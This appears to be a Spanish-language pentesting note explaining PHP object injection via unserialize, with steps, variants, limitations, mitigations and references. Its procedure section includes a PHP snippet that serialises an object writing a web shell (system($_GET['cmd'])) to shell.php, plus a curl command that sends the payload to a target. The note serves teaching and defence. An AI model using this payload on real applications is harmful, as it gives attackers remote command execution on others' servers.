---
topic: Inyección de objetos PHP
tags: [web, php, unserialize, object-injection, rce]
---

# Inyección de objetos PHP

[🌐 English](php-object-injection.en.md) | **Español**

## Concepto

`unserialize` sobre datos del usuario permite construir objetos arbitrarios. Las clases con métodos mágicos como `__destruct`, `__wakeup` o `__toString` pueden escribir archivos, ejecutar comandos o modificar la lógica de la aplicación.

## Cuándo aplica

- La aplicación deserializa una cookie, parámetro o archivo.
- Hay una clase con métodos mágicos útiles.
- El código fuente o el autoload son accesibles.

## Procedimiento

1. Identificar el `unserialize` y el formato.
2. Revisar clases y métodos mágicos.
3. Construir el objeto con `__construct` o serialización manual.
4. Enviar el payload y comprobar el efecto.

```php
class DatabaseExport {
    public $user_file = 'shell.php';
    public $data = '<?php system($_GET["cmd"]); ?>';
}
echo serialize(new DatabaseExport);
```

```bash
curl -G http://<IP>/sator.php --data-urlencode 'arepo=O:14:"DatabaseExport":2:{...}'
```

## Variantes

- Usar `__destruct` para borrar o escribir archivos.
- Explotar `__wakeup` para saltar validaciones.
- Encadenar varias clases (POP chain).

## Limitaciones

- La clase debe estar cargada.
- El payload debe respetar la longitud de las cadenas.
- El punto de entrada debe aceptar el objeto.

## Mitigación y detección

- No deserializar datos externos; usar JSON.
- Validar clases permitidas y firmar los datos.
- Actualizar dependencias y revisar métodos mágicos.

## Referencias

- <https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection>
- <https://www.php.net/manual/en/function.unserialize.php>
- <https://attack.mitre.org/techniques/T1059/006/>
